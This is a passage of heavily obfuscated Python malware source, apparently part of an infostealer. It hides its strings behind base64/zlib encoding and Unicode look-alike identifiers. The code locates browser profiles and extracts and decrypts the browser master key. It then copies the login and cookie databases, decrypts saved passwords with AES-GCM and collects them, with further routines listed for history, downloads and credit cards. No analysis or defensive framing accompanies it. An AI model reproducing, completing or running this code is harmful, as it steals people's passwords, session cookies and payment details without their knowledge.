__𝙞𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK\n\xcf\xc9J\xce\xb5\xacJ2\x8a2\xf0\t\x0f\xcb\x8e2\n\xb5\x05\x00Ji\x06\xb3')).decode(): 𝘴𝙚𝙡𝘧.appdata + __𝘪𝙢𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp5,\x884\xf6*K6\xb2\xccMq\xabp\x8brO\xc9\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xda\x1a\x0b\xa2')).decode(), __𝗶𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\xf0\xcaHJ\xb7\xb5\x05\x00\x0c\xc8\x02\xb2')).decode(): 𝙨𝗲𝗹𝙛.appdata + __𝘪𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b\xf0\x08sI2.\xf0\x8b\n\x0f*\x88\x0c\xab\x08K\xceu+\x8dp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xe4H\x0c\x0c')).decode(), __𝘪𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\rw+\x8dr\x0f3\x01\x00\x0c\x9b\x02\xa3')).decode(): 𝙨𝗲𝗹𝗳.appdata + __𝘪𝗺𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xcb\xc9H\xca\r\xcaIu\xab\x88\x8a\x0c7\xcd\x8e\x8a\xc8pN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00[\x84\x0e\xcd')).decode(), __𝘪𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xc9\r\xb5\x05\x00\rT\x02\xdd')).decode(): 𝘴𝘦𝘭𝗳.appdata + __𝘪𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x8bp\xf5\xaa\x8c\x8c\x88\xca\t5\xb2\xccM\xf1H\xc9H\xce\rK\x0e\xcc\xf3\xcaH\xc9\r-\x01\xd2e)\xc6~9\xc99\x15a\xc9Fa\x95\x9e\xaeA\x19)\xee\xae\xb6\x00\xe9\xfe\x12W')).decode(), __𝗶𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\x8c\xf0*\x88r\xcf1L\n\xb4\xb5\x05\x00\x1a\xa4\x03\xdf')).decode(): 𝘀𝗲𝗹𝗳.appdata + __𝘪𝘮𝗽𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xcd\xa9L\x0c\x0f*H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\x07\x08r')).decode()})
        𝙨𝗲𝘵𝘢𝘵𝘁𝗿(𝘴𝗲𝙡𝘧, 'profiles', [__𝘪𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0br\x0f\xcb\x8d\x8c\x08+Nq\xb4\xb5\x05\x00\x1a\x9f\x03\xf6')).decode(), __𝗶𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x00\x00\x1c\x17\x04j')).decode(), __𝙞𝗺𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x04\x00\x1c\x18\x04k')).decode(), __𝘪𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x02\x00\x1c\x19\x04l')).decode(), __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x00\x00\x1b\xcf\x04"')).decode(), __𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x04\x00\x1b\xd0\x04#')).decode()])
        for (_, 𝗽𝙖𝘵𝘩) in 𝘴𝗲𝗹𝘧.browsers.items():
            if not 𝘰𝙨.path.exists(𝘱𝘢𝘵𝗵):
                continue
            𝘀𝘦𝘵𝙖𝙩𝙩𝙧(𝘀𝙚𝘭𝗳, 'master_key', 𝘀𝗲𝙡𝙛.get_master_key(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝙥𝗮𝘁𝙝)))
            if not 𝘴𝙚𝙡𝗳.master_key:
                continue
            for 𝗽𝗿𝙤𝘧𝗶𝙡𝘦 in 𝘀𝘦𝗹𝗳.profiles:
                if not 𝘰𝙨.path.exists(𝘱𝙖𝘵𝙝 + __𝘪𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗽𝙧𝙤𝙛𝘪𝙡𝘦):
                    continue
                𝙤𝗽𝙚𝘳𝙖𝘵𝗶𝗼𝙣𝘀 = [𝘴𝘦𝘭𝗳.get_login_data, 𝘀𝗲𝘭𝗳.get_cookies, 𝙨𝗲𝗹𝙛.get_web_history, 𝘴𝘦𝙡𝘧.get_downloads, 𝘴𝙚𝗹𝙛.get_credit_cards]
                for 𝗼𝙥𝘦𝙧𝘢𝘵𝙞𝘰𝘯 in 𝗼𝙥𝗲𝙧𝗮𝘁𝘪𝘰𝘯𝘴:
                    try:
                        𝘰𝗽𝘦𝙧𝗮𝘁𝗶𝗼𝗻(𝗽𝘢𝘁𝘩, 𝗽𝗿𝙤𝗳𝗶𝙡𝙚)
                    except 𝗘𝘹𝗰𝗲𝗽𝘵𝗶𝘰𝙣 as e:
                        pass

    def get_master_key(self, path):
        if not 𝙤𝙨.path.exists(𝙥𝙖𝘁𝙝):
            return
        if __𝙞𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝙤𝙥𝙚𝙣(𝘱𝗮𝘁𝙝, __𝘪𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝗺𝘱𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝘰𝙥𝗲𝘯(𝘱𝗮𝘁𝘩, __𝗶𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝙞𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
            𝘤 = 𝙛.read()
        𝗹𝙤𝗰𝘢𝙡_𝘀𝙩𝗮𝘁𝙚 = 𝘫𝙨𝘰𝙣.loads(𝗰)
        𝙢𝘢𝙨𝘵𝘦𝙧_𝘬𝘦𝘺 = 𝘣𝗮𝘀𝗲64.b64decode(𝘭𝘰𝗰𝘢𝘭_𝘀𝘵𝗮𝙩𝗲[__𝘪𝙢𝙥𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝘮𝘢𝘀𝙩𝗲𝗿_𝘬𝗲𝘆 = 𝘮𝗮𝘀𝘁𝙚𝙧_𝗸𝗲𝙮[𝗶𝙣𝘁.from_bytes(𝙢𝙖𝗽(lambda O, i: 714 - (𝙞𝗻𝙩(𝙊) + 𝙞), 𝘮𝙖𝘱(__𝘪𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝗶𝘁𝙚𝘳(__𝘪𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xabr4\x05\x00\x03a\x01?')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝘦(1)), __𝘪𝗺𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘮𝘢𝙨𝘁𝗲𝙧_𝙠𝘦𝙮 = 𝗖𝘳𝙮𝘱𝘵𝗨𝙣𝘱𝗿𝗼𝘵𝗲𝙘𝘵𝘋𝙖𝘁𝘢(𝗺𝘢𝙨𝘵𝙚𝘳_𝙠𝘦𝘺, None, None, None, 𝗶𝘯𝘵.from_bytes(𝗺𝘢𝙥(lambda O, i: 825 - (𝗶𝘯𝘁(𝗢) + 𝙞), 𝙢𝘢𝙥(__𝗶𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝙩𝗲𝘳(__𝙞𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝙚(0)), __𝗶𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝘪𝙣𝘵.from_bytes(𝘮𝗮𝗽(lambda O, i: 600 - (𝘪𝗻𝘁(𝘖) + 𝗶), 𝘮𝘢𝗽(__𝙞𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝗶𝙩𝙚𝗿(__𝙞𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0b\xc96\x05\x00\x03C\x01C')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝘦(1)), __𝘪𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝗺𝙖𝘴𝘁𝗲𝗿_𝘬𝙚𝙮

    def decrypt_password(self, buff, master_key):
        𝙞𝙫 = 𝙗𝙪𝙛𝘧[𝙞𝗻𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 453 - (𝗶𝘯𝙩(𝙊) + 𝘪), 𝙢𝙖𝗽(__𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝙞𝙩𝙚𝗿(__𝙞𝘮𝗽𝙤𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3s\t-\x07\x00\x03)\x01_')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝙚(1)), __𝙞𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝙞𝙣𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 856 - (𝘪𝙣𝘵(𝘖) + 𝙞), 𝘮𝘢𝗽(__𝗶𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝘵𝘦𝘳(__𝙞𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\t\xac\x00\x00\x03&\x01]')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝙚(1)), __𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝗽𝗮𝙮𝗹𝘰𝙖𝗱 = 𝘣𝙪𝗳𝗳[𝗶𝗻𝘁.from_bytes(𝘮𝙖𝗽(lambda O, i: 387 - (𝙞𝘯𝘁(𝘖) + 𝙞), 𝗺𝙖𝘱(__𝙞𝙢𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝙩𝘦𝙧(__𝗶𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xadJ\xae\x04\x00\x03\xe5\x01\xa4')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝙚(1)), __𝗶𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗰𝗶𝘱𝘩𝙚𝘳 = 𝗔𝘌𝘚.new(𝘮𝘢𝘴𝘵𝘦𝘳_𝘬𝘦𝘆, 𝘼𝗘𝗦.MODE_GCM, 𝗶𝘃)
        𝗱𝙚𝘤𝙧𝘺𝙥𝙩𝗲𝗱_𝙥𝘢𝙨𝘴 = 𝗰𝙞𝘱𝙝𝘦𝙧.decrypt(𝗽𝙖𝘆𝘭𝙤𝙖𝘥)
        𝗱𝗲𝙘𝗿𝙮𝙥𝘁𝗲𝘥_𝙥𝙖𝙨𝘀 = 𝙙𝘦𝗰𝗿𝘆𝗽𝙩𝘦𝗱_𝘱𝘢𝙨𝙨[:-𝘪𝙣𝙩.from_bytes(𝗺𝗮𝙥(lambda O, i: 681 - (𝙞𝗻𝙩(𝗢) + 𝗶), 𝙢𝙖𝗽(__𝘪𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝘪𝘵𝘦𝗿(__𝘪𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcb\x8a4\x04\x00\x03]\x01C')).decode())] * 3)), 𝗿𝗮𝗻𝗴𝙚(1)), __𝗶𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝗱𝗲𝗰𝘳𝘆𝙥𝙩𝙚𝙙_𝘱𝙖𝘴𝘀

    def get_login_data(self, path, profile):
        𝗹𝘰𝗴𝗶𝗻_𝗱𝗯 = __𝘪𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x10w\xcb\xbc\xc4p\x93\xf4 w7\x83\xc8@[[\x00Z\\\x07!')).decode().format(𝙥𝙖𝙩𝗵, 𝘱𝗿𝘰𝙛𝙞𝗹𝘦)
        if not 𝙤𝘀.path.exists(𝙡𝙤𝘨𝙞𝘯_𝗱𝘣):
            return
        𝘴𝗵𝘶𝘵𝗶𝙡.copy(𝗹𝗼𝙜𝘪𝗻_𝘥𝗯, __𝗶𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝘤𝙤𝙣𝗻 = 𝘀𝗾𝙡𝙞𝘵𝗲3.connect(__𝙞𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝘤𝙪𝙧𝘴𝘰𝙧 = 𝘤𝘰𝗻𝘯.cursor()
        𝗰𝙪𝗿𝘴𝙤𝘳.execute(__𝗶𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x05\xc1\xbb\x0e@0\x14\x00\xd0_\xd2\x9a:XH\xfa\x10:\x90\xbe\xeeX\x06\xe1\x9a\xa4\x0f\xbe\xde9\xa6\xb1\xf3b\xb4Q\x82\x9f\xbb\xc0\x1c\x91\x91\xed.\x8f\x92\xf6\x03?\xa6\xe0\x08\xfa\x16\x8e(-NC_\x82\xd7\xdfN\xd9\x0b\x9c\xd1\xe0*\x81\xb5\x17\xe6bZ\x89\x9a\x81b\xdaJ\xd7\xfd\xaf\xbb\x1c3')).decode())
        for 𝙧𝙤𝘸 in 𝗰𝘂𝘳𝙨𝙤𝘳.fetchall():
            if not 𝘳𝙤𝘸[𝘪𝘯𝘵.from_bytes(𝙢𝘢𝘱(lambda O, i: 415 - (𝙞𝘯𝘵(𝘖) + 𝘪), 𝘮𝗮𝘱(__𝙞𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝗶𝘁𝙚𝘳(__𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝘦(0)), __𝗶𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝗼𝘄[𝗶𝘯𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 885 - (𝘪𝙣𝙩(𝗢) + 𝘪), 𝙢𝗮𝙥(__𝙞𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝘁𝗲𝗿(__𝗶𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3wI7\x00\x00\x03\n\x01+')).decode())] * 3)), 𝗿𝙖𝙣𝗴𝙚(1)), __𝘪𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝘳𝗼𝘄[𝘪𝗻𝙩.from_bytes(𝗺𝗮𝗽(lambda O, i: 342 - (𝙞𝘯𝙩(𝘖) + 𝗶), 𝗺𝙖𝘱(__𝙞𝙢𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝙩𝙚𝙧(__𝙞𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xad\n,\x07\x00\x03\xbf\x01\x90')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝘦(1)), __𝘪𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙥𝘢𝘴𝘴𝙬𝗼𝗿𝗱 = 𝙨𝘦𝘭𝙛.decrypt_password(𝘳𝗼𝘸[𝘪𝗻𝘁.from_bytes(𝘮𝘢𝙥(lambda O, i: 605 - (𝙞𝘯𝘁(𝙊) + 𝘪), 𝗺𝘢𝙥(__𝘪𝙢𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝙩𝗲𝙧(__𝘪𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcbr\xac\x02\x00\x03v\x01t')).decode())] * 3)), 𝗿𝗮𝙣𝙜𝗲(1)), __𝙞𝘮𝗽𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝙚𝙡𝙛.master_key)
            __𝗟𝘖𝘎𝘐𝘕𝗦__.append(𝗧𝘺𝙥𝙚𝙨.Login(𝗿𝘰𝘄[𝙞𝗻𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 845 - (𝙞𝘯𝘁(𝙊) + 𝗶), 𝗺𝙖𝗽(__𝘪𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝙥(*[𝘪𝙩𝙚𝘳(__𝘪𝘮𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝗴𝙚(0)), __𝗶𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝗼𝙬[𝗶𝙣𝘁.from_bytes(𝙢𝗮𝗽(lambda O, i: 681 - (𝙞𝗻𝙩(𝘖) + 𝘪), 𝗺𝗮𝘱(__𝗶𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝘁𝗲𝗿(__𝗶𝘮𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcbJ/\x07\x00\x03\xbf\x01\x97')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝙚(1)), __𝗶𝘮𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗽𝗮𝘀𝘀𝙬𝙤𝙧𝘥))
        𝘤𝗼𝙣𝙣.close()
        𝗼𝘀.remove(__𝙞𝙢𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path, profile):
        𝗰𝙤𝙤𝗸𝙞𝙚_𝙙𝗯 = __𝙞𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x90\xdc0\x83\x14#\xcb\xcaD\xc3\n\x97$#\xcb\xa2\xc4\xf0\xb0*\x00}L\x08\xfd')).decode().format(𝗽𝘢𝘵𝗵, 𝗽𝘳𝘰𝗳𝗶𝙡𝗲)
        if not 𝗼𝘀.path.exists(𝗰𝘰𝘰𝙠𝗶𝙚_𝗱𝘣):
            return
        𝙨𝘩𝙪𝙩𝘪𝗹.copy(𝘤𝙤𝗼𝗸𝘪𝘦_𝗱𝘣, __𝗶𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝙘𝗼𝙣𝘯 = 𝘀𝘲𝘭𝘪𝙩𝘦3.connect(__𝗶𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝗰𝘶𝙧𝘀𝙤𝗿 = 𝗰𝘰𝘯𝘯.cursor()
        𝗰𝘂𝗿𝘴𝙤𝗿.execute(__𝙞𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝙧𝗼𝘄 in 𝙘𝙪𝙧𝙨𝘰𝗿.fetchall():
            if not 𝗿𝘰𝘸[𝘪𝗻𝘵.from_bytes(𝙢𝗮𝗽(lambda O, i: 782 - (𝗶𝘯𝙩(𝗢) + 𝗶), 𝙢𝙖𝙥(__𝗶𝘮𝗽𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝙞𝙩𝘦𝙧(__𝗶𝗺𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝘦(0)), __𝙞𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), 